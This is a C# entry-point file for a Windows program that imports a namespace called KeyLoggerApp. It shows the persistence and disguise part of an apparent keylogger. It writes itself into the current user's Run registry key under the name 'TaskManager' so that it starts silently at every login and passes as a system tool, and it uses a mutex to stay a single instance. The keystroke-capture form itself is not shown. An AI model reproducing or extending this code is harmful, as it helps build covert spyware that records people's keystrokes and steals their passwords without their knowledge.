using KeyLoggerApp;
using Microsoft.Win32;

namespace VotreApplication
{
    static class Program
    {
        static Mutex mutex = new Mutex(true, "{TaskManager}");

        [STAThread]
        static void Main()
        {
            RegisterProgramInStartup("TaskManager");
            if (mutex.WaitOne(TimeSpan.Zero, true))
            {
                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);

                Application.Run(new Form1());

                mutex.ReleaseMutex();
            }
        }

        static void RegisterProgramInStartup(string appName)
        {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            if (registryKey.GetValue(appName) == null)
            {
                registryKey.SetValue(appName, Application.ExecutablePath);
            }
            else
            {
                string existingPath = registryKey.GetValue(appName).ToString();
                if (!existingPath.Equals(Application.ExecutablePath, StringComparison.OrdinalIgnoreCase))
                {
                    registryKey.SetValue(appName, Application.ExecutablePath);
                }
            }
        }
    }
}
